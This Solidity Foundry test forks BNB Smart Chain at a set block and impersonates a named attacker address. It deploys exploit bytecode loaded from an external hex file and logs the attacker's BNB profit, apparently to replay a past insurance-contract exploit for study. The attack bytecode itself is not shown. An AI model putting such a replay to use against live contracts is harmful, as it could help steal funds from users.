// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";

contract InsuranceReplayTest is Test {
    address constant ATTACKER = 0xD3565b191b28B49Cc517189B984dacDB1FF05304;

    function test_replay() public {
        uint256 fork = vm.createFork("bsc", 131507809);
        vm.selectFork(fork);
        uint256 before = ATTACKER.balance;
        console2.log("attacker BNB before:", before);

        bytes memory data = vm.parseBytes(vm.readFile("test/data/insurance.hex"));
        vm.startPrank(ATTACKER);
        address deployed;
        assembly {
            deployed := create(0, add(data, 0x20), mload(data))
        }
        vm.stopPrank();
        console2.log("deployed:", deployed);

        uint256 afterBal = ATTACKER.balance;
        console2.log("attacker BNB after:", afterBal);
        console2.log("profit BNB (18 decimals):", afterBal - before);
    }
}
